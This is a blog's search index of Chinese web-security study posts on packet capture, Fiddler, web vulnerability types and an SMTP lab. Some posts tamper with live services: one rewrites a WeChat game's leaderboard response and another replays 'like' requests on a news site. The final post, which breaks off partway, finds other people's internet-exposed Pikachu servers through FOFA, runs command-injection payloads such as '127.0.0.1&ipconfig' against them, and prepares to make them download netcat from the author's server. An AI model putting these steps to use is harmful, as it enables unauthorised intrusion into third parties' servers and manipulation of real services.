<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>D4基础入门-加密算法&amp;Web&amp;数据库&amp;系统&amp;代码</title>
      <link href="/post/f52e1c95.html"/>
      <url>/post/f52e1c95.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> Web安全 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -加密解密 -Web安全 -数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D3基础入门-抓包&amp;封包&amp;协议&amp;APP&amp;小程序&amp;PC应用&amp;WEB应用</title>
      <link href="/post/883d81a3.html"/>
      <url>/post/883d81a3.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-抓包技术应用意义"><a href="#0x0-抓包技术应用意义" class="headerlink" title="0x0. 抓包技术应用意义"></a>0x0. 抓包技术应用意义</h2><p> 原始数据-&gt;过滤-&gt;分析,这是数据处理的基本套路,抓包的目的就是为了获取到想要的原始数据，拿到数据以后，我们就可以做以下一些事情:</p><ol><li>分析数据传输协议。</li><li>定位网络协议的问题。</li><li>从数据包中获取想要的信息。</li><li>将截取到的数据包进行修改，伪造，重发。</li></ol><div class="note primary no-icon flat"><p>由于网上的某些应用是看不到的，通过抓包分析，我们可以找到隐藏在应用下的IP，进而找到服务器，实现渗透</p></div><h2 id="0x1-抓包工具"><a href="#0x1-抓包工具" class="headerlink" title="0x1. 抓包工具"></a>0x1. 抓包工具</h2><div class="tip info"><p>由于实现原理不同，不同的抓包工具的应用也不同，只抓HTTP/HTTPS的是靠代理进行截取；抓所有的一般是抓取网络接口</p></div><p>Charles（茶杯）：</p><ul><li>优点：排序合理，会帮你把数据包全部排列好，展示的有条理，是一个 HTTP 代理服务器,HTTP 监视器,反转代理服务器，当浏览器连接 Charles 的代理访问互联网时，Charles 可以监控浏览器发送和接收的所有数据</li><li>缺点：查找包和筛选包麻烦，有时需要筛选很久</li></ul><p>Fiddler：是一个 http 协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的 http 通讯、设置断点、查看所有的“进出”Fiddler 的数据（指 cookie,html,js,css 等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露 http 通讯，还提供了一个用户友好的格式（格式很简单）</p><p>Burpsuite：是用于攻击 web 应用程序的集成平台，包含了许多工具。Burp Suite 为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的 HTTP 消息、持久性、认证、代理、日志、警报，可以点对点提供信息，更清晰</p><div class="note danger modern"><p>这三种工具基本只能抓web应用（走http协议的）其余协议抓不到</p></div><p>下面介绍其余几种可以抓其他协议的</p><p> Wireshark：是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark 使用 WinPCAP 作为接口，直接与网卡进行数据报文交换，所以基本上所有的协议可以抓到</p><p>科来网络分析系统：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题，可以分进程查看数据包。<mark class="hl-label purple">全中文界面，对新手十分友好</mark> </p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406205327653.png" alt="image-20240406205327653"></p><h2 id="0x2-封包技术"><a href="#0x2-封包技术" class="headerlink" title="0x2. 封包技术"></a>0x2. 封包技术</h2><p>首先要了解抓包和封包有什么区别，其实就是零散和整体的区别，抓包抓的可能是很多零散的包，即一次事件会产生很多个数据包，抓包会把所有的数据包抓出来并一条一条呈现在面前，封包技术就是把一次事件产生的所有数据包放在一起呈现在面前，即<strong>零散和整体</strong>的区别</p><p>使用封包监听工具（傻瓜式一体化抓封包，WPE也可以，但是并不是一体化，有点麻烦）</p><p>下载地址：封包监听工具2.3</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">https://pan.baidu.com/s/18l6LhKJd3NWPAr46DLQhZw</span><br></pre></td></tr></table></figure><p>提取码：03hz</p><h2 id="0x3-实战案例-使用封包技术完成自动回城"><a href="#0x3-实战案例-使用封包技术完成自动回城" class="headerlink" title="0x3. 实战案例-使用封包技术完成自动回城"></a>0x3. 实战案例-使用封包技术完成自动回城</h2>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> Web安全 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 抓包封包技术 </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 协议 </tag>
            
            <tag> APP </tag>
            
            <tag> PC应用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fiddler抓取微信小程序包</title>
      <link href="/post/20fa1015.html"/>
      <url>/post/20fa1015.html</url>
      
        <content type="html"><![CDATA[<p class='p center logo large red'>声明</p><ul><li><p>该博客大部分文章来自作者日常学习笔记，未经授权，严禁转载，如需转载，联系我</p></li><li><p>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本博客无关</p></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 30%" aria-valuenow="30" aria-valuemin="0" aria-valuemax="100"><p>0x0.前言</p></div></div></h2><div class="note primary no-icon flat"><p>最近看了看一些公众号上的文章，发现一个用fiddler抓取羊了个羊的教程。对我这种小白来说，这种实验既有吸引力复现难度也不高，所以打算自己动手实操一下😍😍😍</p><p>以下内容是对本次实验的复现</p></div><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 60%" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100"><p>0x1.实验准备</p></div></div></h2><h3 id="1-fiddler简介"><a href="#1-fiddler简介" class="headerlink" title="1. fiddler简介"></a>1. fiddler简介</h3><div class="note primary no-icon flat"><p>最开始的时候，发现作者使用了fiddler这个工具，当时没听说过这个工具，很好奇和burp、wireshark有什么区别，后来在实际应用中呢，发现它好像综合了burp和wireshark，fiddler可以将网络传输发送与接收的数据包进行截获、重发、编辑和转存等操作；fiddler是通过改写HTTP代理，让数据从它那里通过，并监控并且截取到数据，并且在打开的一瞬间设置好了浏览器代理，关闭fiddler的时候，它又把代理还原了，这一点比burp好用多了，不像burp有时候忘记关代理，浏览器直接用不了🥵🥵</p><p>我个人觉得比较好的是fiddler的界面比较好看，没有wireshark那么单调，直接上图 </p></div><p><img src="C:/Users/31677/AppData/Roaming/Typora/typora-user-images/image-20240404235046303.png" alt="image-20240404235046303"></p><p>fiddler自带的图标可以很明确的告诉我们一些相关的信息，可以来说非常的方便</p><h3 id="2-下载Fiddler-Classic"><a href="#2-下载Fiddler-Classic" class="headerlink" title="2. 下载Fiddler Classic"></a>2. 下载Fiddler Classic</h3><p>👉<a href="https://www.telerik.com/download/fiddler">快速通道</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240405112335917.png" alt="image-20240405112335917"></p><p>下载exe文件后无脑安装，嘎嘎下一步就行，选好自己的路径就可以</p><h3 id="3-下载并安装Fiddler证书生成器"><a href="#3-下载并安装Fiddler证书生成器" class="headerlink" title="3. 下载并安装Fiddler证书生成器"></a>3. 下载并安装Fiddler证书生成器</h3><p>👇 👇 👇 👇 👇 👇</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://www.telerik.com/docs/default-source/fiddler/addons/fiddlercertmaker.exe?sfvrsn=2</span><br></pre></td></tr></table></figure><h3 id="4-配置Fiddler"><a href="#4-配置Fiddler" class="headerlink" title="4. 配置Fiddler"></a>4. 配置Fiddler</h3><p>打开Fiddler，点击Tools——&gt;Options</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/b3e9920fd4e8f1ab0bcc1b870382af8c.png" alt="b3e9920fd4e8f1ab0bcc1b870382af8c"></p><p>进入HTTPS选项进行设置，勾选如下图所示即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/bcaf5114f203da95138d603f777eb90c.png" alt="bcaf5114f203da95138d603f777eb90c"></p><p>之后点击右上角Actions选项，选择Export Root Certificate to Desktop，将Fiddler的证书导入在桌面上，你的桌面上将会出现FiddlerRoot.cer文件，点击OK设置成功</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/faaa66ac42053ae9d274d8b8a2d094f8.png" alt="faaa66ac42053ae9d274d8b8a2d094f8"></p><p>点击Connections，设置如下所示，将端口号设置为8888，勾选如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/94dcbf2b5255953c34912722586a8d53.png" alt="94dcbf2b5255953c34912722586a8d53"></p><p>设置完之后重启Fiddler，就可以开始抓包了</p><h3 id="5-浏览器导入FiddlerRoot-cer证书"><a href="#5-浏览器导入FiddlerRoot-cer证书" class="headerlink" title="5. 浏览器导入FiddlerRoot.cer证书"></a>5. 浏览器导入FiddlerRoot.cer证书</h3><p>以Edge浏览器为例，打开浏览器设置，在设置的搜索框中输入证书，找到管理证书界面，并点击</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c512f2bde23d9420e3b11b55d10cc588.png" alt="c512f2bde23d9420e3b11b55d10cc588"></p><p>找到受信任的根证书颁发机构，点击导入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f4f2ce705bc1e83d7de13adb19c6b690.png" alt="f4f2ce705bc1e83d7de13adb19c6b690"></p><p>按照它的指导将FiddlerRoot.cer导入进去，导入之后重启Fiddler就可以抓包了</p><h2 id="-2"><a href="#-2" class="headerlink" title=""></a><div class="progress"><div class="progress-bar-animated progress-bar progress-bar-striped bg-blue"  style="width: 90%" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100"><p>0x2.开始抓包</p></div></div></h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0f8c368c50b7f8166d9298dd380829d3.png" alt="0f8c368c50b7f8166d9298dd380829d3"></p><p>打开微信，点击右上角设置按钮，进入设置页面，使用代理点击开启</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406104011652.png" alt="image-20240406104011652"></p><p>填写如下所示，地址填写主机ip地址，端口填写Fiddler设置的端口号，点击确定即可（<strong>注意一定要将fiddler打开，不然连接不上</strong>）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110429389.png" alt="image-20240406110429389"></p><p>看到有WeChat包的时候说明此时可以抓取到WeChat，之后点击小程序，打开羊了个羊</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406110631667.png" alt="image-20240406110631667"></p><p>看到这个sheep的，就知道是抓取到了羊了个羊</p><p>如果要修改排名信息，可以点开排行榜，可以看到我们抓取到了相关的数据包，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111527252.png" alt="image-20240406111527252"></p><p>设置断点，准备拦截下一次的请求，找到主页框Rules。下拉找到Automatic Breakpoint，点击Before Requests，即在全部请求前设置断点</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111649105.png" alt="image-20240406111649105"></p><p>之后再打开羊了个羊的排行榜，发现排行榜加载不出来，说明拦截成功，接下来改包返回即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406111853888.png" alt="image-20240406111853888"></p><p>在fiddler界面上，点击Break on response，在Raw下改包</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/af6d4b3d035435f128c530a112758836.png" alt="af6d4b3d035435f128c530a112758836"></p><p>改好后点击Run to Completion，看羊了个羊主界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/030b07d5697a4c7c8e4b38696e48f255.png" alt="030b07d5697a4c7c8e4b38696e48f255"></p><p>改包成功！！！</p><div class="note danger modern"><p>操作有风险，模仿需谨慎</p></div>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 随便试试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> 抓包 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D2基础入门-Web应用&amp;架构建设&amp;漏洞&amp;HTTP数据包&amp;代理服务器</title>
      <link href="/post/16b91a53.html"/>
      <url>/post/16b91a53.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-知识点速览"><a href="#0x0-知识点速览" class="headerlink" title="0x0. 知识点速览"></a>0x0. 知识点速览</h2><ol><li>网站搭建前置知识</li><li>WEB应用环境架构类</li><li>WEB应用安全漏洞分类</li><li>WEB请求返回过程数据包</li></ol><h2 id="0x1-网站搭建前置知识"><a href="#0x1-网站搭建前置知识" class="headerlink" title="0x1. 网站搭建前置知识"></a>0x1. 网站搭建前置知识</h2><p>域名：符号化的地址方案，来代替数字型的 IP 地址，每一个符号化的地址都与特定的IP地址对应，为了方便人们记忆而不用记住IP地址</p><p>DNS：Domain Name System，域名系统，因特网上作为域名和IP地址互相映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名，最终得到该主机对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p><h2 id="0x2-WEB应用环境架构类"><a href="#0x2-WEB应用环境架构类" class="headerlink" title="0x2. WEB应用环境架构类"></a>0x2. WEB应用环境架构类</h2><p>理解不同WEB应用组成角色功能架构：</p><p><strong>开发语言，程序源码，中间容器，数据库类型，服务器操作系统，第三方软件等</strong></p><ul><li>开发语言：asp，php,aspx,jsp,java,python,ruby,go,html等</li><li>程序源码：根据开发语言分类；应用类型分类（交友||论坛||博客）；开源CMS分类（用的人多了之后变成CMS源码）；开发框架分类（源码封装后变为框架，直接调用）等</li><li>中间件容器（支持网站运行）：IIS，Apache，Nginx，Tomcat，Weblogic，Jboos，glasshfish等</li><li>数据库类型：Access，Mysql，Oracle，db2，Sybase，Redis，MongoDB</li><li>服务器操作系统：Linux、Windows、Mac系列</li><li>第三方软件：phpmyadmin，vs-ftpd，VNC，ELK，Openssh等</li></ul><p>通过详细了解上述角色功能架构，可以方便我们对症下药，在爆出漏洞的第一时间知道相关的知识</p><h2 id="0x3-WEB应用安全漏洞分类"><a href="#0x3-WEB应用安全漏洞分类" class="headerlink" title="0x3. WEB应用安全漏洞分类"></a>0x3. WEB应用安全漏洞分类</h2><p>明白一个理念，关于WEB应用安全的漏洞，大部分都是在程序源码中产生的（<strong>代码写的不好产生安全问题</strong>）</p><ul><li><p>SQL注入：当web应用向后台数据库传递SQL语句进行数据库操作时，如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</p></li><li><p>文件安全：用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器</p></li><li><p>RCE执行：RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统</p></li><li><p>XSS跨站：跨站脚本攻击XSS(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页面时，嵌入Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。XSS攻击针对的是用户层面的攻击</p></li><li><p>CRLF：这个漏洞名词来源于打印机，在计算机中表示一行的结束，通过控制CR和LF的出现，在拼接http响应头的过程中，服务器检测到<code>\r\n</code>的时候会按照http规范认为已经到达一行的末尾，后面的数据输出到下一行。在对文件进行io读写的时候也经常会以<code>\r\n</code>或者<code>\n</code>作为判断行末尾的依据，后面的数据换行后再输出</p></li><li><p>SSRF：SSRF的意思是服务端请求伪造，如字面意思，就是攻击者构造的由服务器发起请求的一种漏洞。而服务端能够访问外界访问不到的内网，因此可以利用这个特性来攻击部署在内网的脆弱中间件以及其他服务</p></li><li><p>CSRF：中文翻译叫跨站请求伪造，和XSS利用方式有点像，但是XSS利用的是站点内信任的用户，而CSRF是通过伪装成被信任的用户请求受信任网站</p></li><li><p>反序列化：反序列化就是指把字节序列恢复为Java对象的过程</p></li><li><p>逻辑越权：逻辑越权漏洞就是当用户跳过自己的权限限制，去操作同等级用户或者上级用户。正常的情况下，当一个用户去访问某个资源的时候，首先需要去登录验证自己的权限，其次是对数据的查询，最后返回数据内容。但是如果在权限验证这里，出现了验证不足或者根本就没有验证，那么就会导致越权漏洞的出现</p></li><li><p>未授权访问：是在攻击者没有获取到登录权限或未授权的情况下，或者不需要输入密码，即可通过直接输入网站控制台主页面地址，或者不允许查看的链接便可进行访问，同时进行操作</p></li><li><p>XXE/XML：外部实体注入（也称为 XXE）是一种 Web 安全漏洞，允许攻击者干扰应用程序对 XML 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互</p></li><li><p>弱口令安全：使用别人容易猜测到的或者破解工具容易破解的口令</p></li></ul><h2 id="0x4-HTTP状态码相关"><a href="#0x4-HTTP状态码相关" class="headerlink" title="0x4. HTTP状态码相关"></a>0x4. HTTP状态码相关</h2><p>文件夹目录返回403，表示文件夹存在（<strong>403为权限不够，不能查看文件夹目录</strong>）404表示不存在</p><p>文件返回200存在，返回404不存在</p><p>3xx表示跳转：处置过程，判断可有可无</p><p>5xx表示内部错误：服务器问题，文件判断可有可无</p><p>所以在使用目录扫描时，3xx和5xx一般勾选上（自己无法判断，宁可错误也别放过）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240406172115150.png" alt="image-20240406172115150"></p><h2 id="0x5-代理服务"><a href="#0x5-代理服务" class="headerlink" title="0x5. 代理服务"></a>0x5. 代理服务</h2><p>代理包括内部代理和远程代理，内部代理就是burp、fiddler等一类中间工具</p><p>远程代理：快速更换代理，防止被拉黑被溯源，防止身份鉴别（web搜索<strong>快代理</strong>可以购买）</p><h2 id="0x6-演示案例"><a href="#0x6-演示案例" class="headerlink" title="0x6. 演示案例"></a>0x6. 演示案例</h2><h3 id="1-请求包-新闻回帖点赞-重放数据包"><a href="#1-请求包-新闻回帖点赞-重放数据包" class="headerlink" title="1.请求包-新闻回帖点赞-重放数据包"></a>1.请求包-新闻回帖点赞-重放数据包</h3><div class="note danger modern"><p>仅对于无身份认证的网页有效，有身份认证的无法重复刷赞（代码逻辑不一样，限定条件不一样）</p></div><p>将浏览器配置改为和自己burp配置相同（推荐一个小工具，Edge插件proxy switcher）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/a9bfca6a5fe6d48175660023e6ffad58.png" alt="a9bfca6a5fe6d48175660023e6ffad58"></p><p>打开新浪网，随便点开一个新闻，进入评论，同时把burp的拦截打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/9025310b3400c30f0a7a3df0b991b94d.png" alt="9025310b3400c30f0a7a3df0b991b94d"></p><p>点赞后，抓取数据包，不停的转发数据包，可以发现点赞数一直在上升</p><h3 id="2-请求包-修改UA头"><a href="#2-请求包-修改UA头" class="headerlink" title="2.请求包-修改UA头"></a>2.请求包-修改UA头</h3><p>有时候电脑不能访问到手机的某些页面，即某些网页只针对于手机界面，此时可以通过burp修改数据包请求头（UA）使得电脑浏览器能够访问到手机界面，进而进行一些操作</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> Web安全 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> 架构建设 </tag>
            
            <tag> 代理服务器 </tag>
            
            <tag> 漏洞 </tag>
            
            <tag> HTTP数据包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计网实验-实现SMTP发送邮件</title>
      <link href="/post/66fb5f37.html"/>
      <url>/post/66fb5f37.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li><p>本博客仅用于个人复习和学习，无商业用途</p></li><li><p>遇到问题，优先在本页搜索，检查是否有相关教程</p></li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0x0-启动Windows的telnet服务"><a href="#0x0-启动Windows的telnet服务" class="headerlink" title="0x0.启动Windows的telnet服务"></a>0x0.启动Windows的telnet服务</h2><p>如下图所示，用命令行启动telnet服务，telent需要在windows设置中打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084015.png" alt=""></p><h2 id="0x1-打开QQ邮箱的SMTP服务"><a href="#0x1-打开QQ邮箱的SMTP服务" class="headerlink" title="0x1.打开QQ邮箱的SMTP服务"></a>0x1.打开QQ邮箱的SMTP服务</h2><p>QQ邮箱的SMTP服务是默认关闭的，故需要我们手动打开</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084227704.png" alt="image-20240401084227704"></p><h2 id="0x2-输入telnet-smtp-qq-com-25"><a href="#0x2-输入telnet-smtp-qq-com-25" class="headerlink" title="0x2.输入telnet smtp.qq.com 25"></a>0x2.输入telnet smtp.qq.com 25</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401084454941.png" alt="image-20240401084454941"></p><p>服务器返回220，表示已经与服务器连接成功</p><h2 id="0x3-登录自己的邮箱账户"><a href="#0x3-登录自己的邮箱账户" class="headerlink" title="0x3.登录自己的邮箱账户"></a>0x3.登录自己的邮箱账户</h2><h3 id="输入helo-qq-com-向服务器表明身份"><a href="#输入helo-qq-com-向服务器表明身份" class="headerlink" title="输入helo qq.com,向服务器表明身份"></a>输入helo qq.com,向服务器表明身份</h3><p>返回250 ok，表明SMTP服务器有能力接收邮件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/20240401084919.png" alt=""></p><p>输入auth login，登录账户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085053018.png" alt="image-20240401085053018"></p><p>返回 334 VXNlcm5hbWU6，拿去Base64解码，发现是Username：</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085403195.png" alt="image-20240401085403195"></p><p>说明这是密文传输，提醒我们要将自己的用户名和密码也用Base64加密后进行传输</p><h3 id="输入邮箱的base64编码"><a href="#输入邮箱的base64编码" class="headerlink" title="输入邮箱的base64编码"></a>输入邮箱的base64编码</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401085633318.png" alt="image-20240401085633318"></p><h3 id="输入授权码"><a href="#输入授权码" class="headerlink" title="输入授权码"></a>输入授权码</h3><p>授权码在开启SMTP服务时系统会给你一个授权码，<strong>注意：这里不是输自己QQ邮箱的密码！！！不是自己QQ邮箱的密码！！！</strong>，如果显示连接不上，多试几次，可能很大一部分原因是服务器繁忙</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092432509.png" alt="image-20240401092432509"></p><p>出现如上，表明登录成功，可以开始和服务器进行交互了</p><h2 id="0x4-实验各种命令进行发邮件"><a href="#0x4-实验各种命令进行发邮件" class="headerlink" title="0x4.实验各种命令进行发邮件"></a>0x4.实验各种命令进行发邮件</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092705247.png" alt="image-20240401092705247"></p><p>发现在输入收件人邮箱时一直出现502状态码，后查询资料，发现不能使用常见的25端口，要使用经常加密的587端口，后续将端口换成587，重复上述操作。</p><p>输入以下图片上的命令</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092840797.png" alt="image-20240401092840797"></p><p>得到相关的结果</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240401092914047.png" alt="image-20240401092914047"></p><p>实验至此结束</p>]]></content>
      
      
      <categories>
          
          <category> 学校课程 </category>
          
          <category> 计算机网络 </category>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> SMTP </tag>
            
            <tag> pop3 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实战案例-Fofa拿下pikachu服务器（文件上传下载&amp;webshell）</title>
      <link href="/post/b9d95899.html"/>
      <url>/post/b9d95899.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ol><li>本博客仅用于个人复习和学习，无商业用途</li><li>遇到问题，优先在本页搜索，检查是否有相关教程</li><li>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者以及本博客无关</li></ol><h2 id="0-实验需要"><a href="#0-实验需要" class="headerlink" title="0.实验需要"></a>0.实验需要</h2><ol><li>一台自己的服务器</li><li>netcat工具（瑞士军刀）</li><li>能动手操作的决心，不怕困难的决心</li></ol><h2 id="1-打开FOFA"><a href="#1-打开FOFA" class="headerlink" title="1.打开FOFA"></a>1.打开FOFA</h2><h3 id="FOFA是什么？"><a href="#FOFA是什么？" class="headerlink" title="FOFA是什么？"></a>FOFA是什么？</h3><p>FOFA是一款网络空间测绘的搜索引擎，旨在帮助用户以搜索的方式查找公网上的互联网资产。简单来说，FOFA的使用方式类似于谷歌或百度，用户可以输入关键词来匹配包含该关键词的数据。不同的是，这些数据不仅包括像谷歌或百度一样的网页，还包括像摄像头、打印机、数据库、操作系统等资产。</p><p>网络空间测绘可以被认为是网络空间的“地图”。就像谷歌地图或高德地图通过卫星图像对地形进行测绘，网络空间测绘也是通过技术探针对全球网络资产进行探测。</p><p>然而，网络空间分为公网和内网。FOFA主要针对公网上的资产进行探测，类似于谷歌地图上的建筑物（IP地址），虽然可以看到建筑物的外部结构和规模，但无法了解内部的情况。这是因为侵犯内网的隐私是违法的。（懂的都懂👀）</p><p>快速通道👉<a href="https://fofa.info/">FOFA</a></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331163505752.png" alt="FOFA主界面"></p><center>FOFA主界面</center><h2 id="2-查找pikachu服务器"><a href="#2-查找pikachu服务器" class="headerlink" title="2.查找pikachu服务器"></a>2.查找pikachu服务器</h2><p>在搜索框中输入以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;pikachu&quot;</span>&amp;&amp;country=<span class="string">&quot;CN&quot;</span>&amp;&amp;title==<span class="string">&quot;Get the pikachu&quot;</span></span><br></pre></td></tr></table></figure><p>随机选择一个服务器进入，点击侧边栏RCE下拉框，找到exec”ping”，点击进入</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/%7BD3E49BC8-61EB-4eec-AD69-14614714C341%7D.png" alt="{D3E49BC8-61EB-4eec-AD69-14614714C341}"></p><p>在ping框中输入127.0.0.1并执行，检测服务器是否能够执行命令，当出现以下页面时，说明该服务器不能执行命令，需要重新更换一个服务器</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331165457614.png" alt="image-20240331165457614"></p><p>直至出现以下页面，说明有我们想要的代码执行漏洞存在（可能找的过程会比较漫长，请保持耐心🤡）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171346526.png" alt="image-20240331171346526"></p><h2 id="3-查看服务器ip地址"><a href="#3-查看服务器ip地址" class="headerlink" title="3.查看服务器ip地址"></a>3.查看服务器ip地址</h2><p>输入127.0.0.1&amp;ipconfig或者127.0.0.1&amp;ifconfig进行查看ip地址，如果服务器是windows操作系统，则为127.0.0.1&amp;ipconfig；如果为linux操作系统，则为127.0.0.1&amp;ifconfig，返回如下界面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331171904747.png" alt="image-20240331171904747"></p><p>说明服务器ip地址为10.0.12.10</p><h2 id="4-查看服务器文件夹"><a href="#4-查看服务器文件夹" class="headerlink" title="4.查看服务器文件夹"></a>4.查看服务器文件夹</h2><p>输入127.0.0.1&amp;dir查看服务器文件夹</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331172219218.png" alt="image-20240331172219218"></p><h2 id="5-执行文件下载命令"><a href="#5-执行文件下载命令" class="headerlink" title="5.执行文件下载命令"></a>5.执行文件下载命令</h2><p>将nc.exe放在自己的服务器根目录（wwwroot/My_blog）下，这里我的服务器是使用的宝塔界面（按自己实际需求来）</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173827166.png" alt="image-20240331173827166"></p><p>当访问47.109.189.205（我服务器的公网ip）时，会自动下载nc.exe，如下图测试所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240331173648842.png" alt="image-20240331173648842"></p><p>这里出现无法下载是因为我的火狐拦截了nc.exe，所以测试仍然成功</p><p>在pikachu服务器上执行自动下载的命令，相关的命令可以去<a href="https://forum.ywhack.com/bountytips.php?download">[~]#棱角 ::Edge.Forum* 